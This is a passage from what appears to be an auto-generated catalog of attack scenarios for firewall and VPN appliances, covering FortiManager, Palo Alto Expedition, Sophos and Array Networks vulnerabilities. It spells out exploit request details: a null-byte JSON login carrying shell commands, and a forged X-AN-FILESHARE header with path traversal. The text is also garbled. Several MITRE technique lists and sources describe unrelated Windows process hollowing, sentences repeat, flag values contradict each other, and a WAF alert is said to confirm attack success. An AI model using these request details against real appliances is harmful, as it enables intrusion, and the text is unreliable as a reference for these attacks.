  - Stage 3 (T1005 · T1005 / T1552.001): **Stage 3: Exfiltration of Managed FortiGate Configurations (/var/fwclient & globaldb)** — Instead of attacking one firewall, the intruder bags up the central filing cabinet holding the full configuration and passwords for every firewall in the company. Running as root, UNC5820 compressed /var/fwclient and /var/fds/data into /tmp/.tm.tar.gz and exfiltrated the archive (capturing the complete FortiOS configuration files, IPsec VPN pre-shared keys, network object definitions, and ENC AK1... / PBKDF2 administrator password hashes for every downstream FortiGate firewall managed by the appliance). In the documented Firewall exchange from FortiManager Daemon (fgfmsd Port 541) to FortiManager Root Shell (rcs_checkout), FortiManager Root Shell (rcs_checkout) responds with ACK T1005 (confirming that the Stage 3: Exfiltration of Managed FortiGate Configurations (/var/fwclient & globaldb) request succeeded on FortiManager Root Shell (rcs_checkout) and completing the final execution objective of FortiManager fgfmsd Unauthenticated API RCE ("FortiJump" CVE-2024-47575 / UNC5820)). ### T1190: Palo Alto Expedition Admin Reset (CVE-2024-5910) & Cron RCE Chain (CVE-2024-9463)

Palo Alto Networks Expedition is a migration utility used by network engineers to convert Cisco, Check Point, and Fortinet firewall configurations into PAN-OS format and push them to live firewalls via XML API keys. In 2024, researchers at Horizon3.ai and Unit 42 detailed critical flaws, CVE-2024-5910 (unauthenticated admin reset via restoreAdmin.php) and CVE-2024-9463/9464 (OS command injection in CHECKPOINT.php and cron handlers), allowing attackers to compromise Expedition and steal live PAN-OS firewall API keys from its MySQL database.

### T1190: Sophos Firewall User Portal/Webadmin JSON Code Injection (CVE-2022-3236 / DriftingCloud)
- **Scenario ID**: `sophos-firewall-cve-2022-3236-asnarok`
- **Canonical URL**: https://attackexplorer.org/scenarios/sophos-firewall-cve-2022-3236-asnarok
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=sophos-firewall-cve-2022-3236-asnarok
- **Category**: ZERO_DAY_APPLIANCES | **Severity**: CRITICAL
- **Subtitle**: Zero-Day Appliances · T1190
- **Overview**: Imagine a two-person security desk where the front guard checks that your name badge only has normal letters, but stops reading as soon as they hit an invisible blank spot (null byte). The back-office clerk reads right past the blank spot and types the rest of your badge into the master control computer. In September 2022, Sophos and Volexity disclosed CVE-2022-3236 (CVSS 9.8), an unauthenticated code injection vulnerability in Sophos Firewall v19.0 MR1 and older exploited as a zero-day by China-nexus APT DriftingCloud. By sending a crafted mode=151 JSON login request containing non-printable ASCII bytes (%00 / \u0000) and shell commands to /userportal/Controller or /webconsole/Controller, attackers bypassed the Java servlet filter and achieved root command execution in the backend csc service.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **Stage 1: Crafted JSON mode=151 Request to /webconsole/Controller (CVE-2022-3236)** — Imagine a two-person security desk where the front guard checks that your name badge only has normal letters, but stops reading as soon as they hit an invisible blank spot (null byte). The back-office clerk reads right past the blank spot and types the rest of your badge into the master control computer. DriftingCloud sent an unauthenticated HTTP POST request to /userportal/Controller (or /webconsole/Controller) with mode=151 and a json parameter whose "username" field contained a null byte (\u0000) or newline followed by backtick shell commands. This exploited CVE-2022-3236 (a parser differential between the front-end Java servlet filter, which stopped validating at the null byte, and the backend csc service, which processed the full string). Because mode=151 is the standard pre-authentication login request handler for both the User Portal and Webadmin, the exploit worked without any prior credentials. In the documented WAF exchange from DriftingCloud Operator (JSON Payload) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1190 (confirming that the Stage 1: Crafted JSON mode=151 Request to /webconsole/Controller (CVE-2022-3236) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Cyberoam System Controller (csc) Perl/Shell Evaluation as Root).   - Stage 2 (T1059.004 · Unix Shell): **Stage 2: Cyberoam System Controller (csc) Perl/Shell Evaluation as Root** — The back-office controller (csc), which runs with master building keys, reads the second half of the forged badge and executes it as a root shell command.   - Stage 3 (T1556 · Protocol Tunneling): **Stage 3: Trojanized Login CGI Credential Harvesting & Persistent Reverse Tunnel** — With control of the firewall, the spy wires a secret recorder into the login page to write down every employee’s VPN password and digs a hidden tunnel into the internal office network. ### T1190: Array Networks AG SSL VPN X-AN-FILESHARE flags Header Bypass & LODEINFO (CVE-2023-28461)
- **Scenario ID**: `array-networks-ag-vxag-cve-2023-28461`
- **Canonical URL**: https://attackexplorer.org/scenarios/array-networks-ag-vxag-cve-2023-28461
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=array-networks-ag-vxag-cve-2023-28461
- **Category**: ZERO_DAY_APPLIANCES | **Severity**: CRITICAL
- **Subtitle**: Zero-Day Appliances · T1190
- **Overview**: Imagine a VIP hotel entrance where the internal intercom header (X-AN-FILESHARE) has a status checkbox labeled "Already Verified by Front Desk (flags=c3248)." A spy walks straight from the street, hands the bellhop a note with that checkbox ticked and a "../../../../" path, and walks into the hotel’s security room, using it as a staging base to sneak into guest suites. Reported by JPCERT/CC and analyzed by Trend Micro and Unit 42 in campaigns attributed to Earth Kasha (MirrorFace), CVE-2023-28461 (CVSS 9.8) is a critical authentication bypass and path traversal flaw in ArrayOS AG (< 9.4.0.484) on Array Networks SSL VPN gateways. By sending an HTTP request to /prx/000/http/localhost/client_sec/... containing the header X-AN-FILESHARE: ... flags=c3248; fshare_template=../../../../, an unauthenticated attacker bypasses session authentication, reads gateway configurations, drops a PHP webshell and SOCKS5 relay (s5n), and pivots to internal Windows machines to deploy LODEINFO and NOOPDOOR.
- **MITRE ATT&CK Techniques**: T1055.012 (Process Injection: Process Hollowing - Defense Evasion / Privilege Escalation), T1106 (Native API Execution (CreateProcessW / NtUnmapViewOfSection) - Execution), T1071.001 (Application Layer Protocol: Web Protocols (HTTPS C2) - Command and Control)
- **Primary Analytical Sources**: Microsoft Win32 API Reference: CreateProcessW (CREATE_SUSPENDED), VirtualAllocEx & WriteProcessMemory (https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) | Microsoft Sysinternals: Sysmon Event ID 25: ProcessTampering (Image is replaced) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-25-processtampering) | Elastic Security Labs: Hunting Memory Injection & Process Tampering via Kernel ETW Threat Intelligence (https://www.elastic.co/security-labs)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **Stage 1: X-AN-FILESHARE flags=00300 Header Authentication Bypass (CVE-2023-28461)** — An external visitor attaches an internal routing slip (X-AN-FILESHARE) to their request with the "pre-approved" bit switched on, fooling the gateway into skipping login completely. Earth Kasha sent an unauthenticated HTTP request to /prx/000/http/localhost/client_sec/%00/add_folder supplying the custom header X-AN-FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248; fshare_template=../../../../. Because the ArrayOS reverse proxy failed to strip external X-AN-FILESHARE headers (CVE-2023-28461) and trusted the 00300 bitmask inside flags=c3248 as proof of an authenticated FileShare session, the backend processed fshare_template with ../ directory traversal without requiring a login (Combining the flags authentication bypass with the fshare_template relative path traversal gave unauthenticated attackers arbitrary file read and script execution on the SSL VPN appliance In the documented WAF exchange from Earth Kasha MirrorFace Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1190 confirming that the Stage 1: X-AN-FILESHARE flags=00300 Header Authentication Bypass CVE-2023-28461 request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Arbitrary File Read of Gateway Configs & PHP Webshell Deployment). Combining the flags authentication bypass with the fshare_template relative path traversal gave unauthenticated attackers arbitrary file read and script execution on the SSL VPN appliance. In the documented WAF exchange from Earth Kasha (MirrorFace) Operator to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1190 (confirming that the Stage 1: X-AN-FILESHARE flags=00300 Header Authentication Bypass (CVE-2023-28461) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Arbitrary File Read of Gateway Configs & PHP Webshell Deployment).
